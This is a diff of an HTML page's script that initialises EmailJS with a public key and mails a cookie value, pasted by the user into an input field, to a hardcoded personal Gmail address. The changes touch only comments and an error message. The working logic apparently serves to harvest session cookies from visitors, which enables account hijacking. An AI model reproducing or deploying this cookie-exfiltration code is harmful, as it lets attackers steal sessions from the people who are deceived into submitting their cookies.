@@ -74,8 +74,8 @@
   <!-- Include EmailJS -->
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
-    // Initialize EmailJS
-    emailjs.init("1RUraa7fRYbQ2fuPR"); // Replace with your actual User ID
+    // Initialize EmailJS with the User ID (Public Key)
+    emailjs.init("1RUraa7fRYbQ2fuPR");
 
     function sendCookie() {
       const cookieInput = document.getElementById('cookieInput').value;
@@ -92,17 +92,17 @@
         return;
       }
 
-      // Send email with EmailJS
+      // Send email using EmailJS
       emailjs.send("service_bupfcwd", "template_fkuvg0k", {
-        cookie: cookieInput,
-        to_email: "simplyb4th@gmail.com"
+        cookie: cookieInput, // This is the variable used in your template
+        to_email: "simplyb4th@gmail.com" // Your email address
       })
       .then(() => {
         successMessage.textContent = 'Cookie sent successfully.';
       })
       .catch((error) => {
         console.error("Error sending email:", error);
-        errorMessage.textContent = 'Failed to send cookie. Check console for details.';
+        errorMessage.textContent = 'Failed to send cookie. Check the console for details.';
       });
     }
   </script>
